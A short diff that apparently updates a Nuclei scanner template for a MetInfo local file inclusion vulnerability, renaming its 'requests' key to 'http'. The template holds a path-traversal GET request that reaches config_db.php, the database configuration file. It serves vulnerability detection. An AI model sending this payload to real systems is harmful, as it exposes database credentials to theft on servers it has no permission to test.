@@ -7,7 +7,7 @@ info:
   description: A vulnerability in MetInfo allows remote unauthenticated attackers access to locally stored files and their content.
   tags: metinfo,lfi
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/include/thumb.php?dir=http/.....///.....///config/config_db.php'
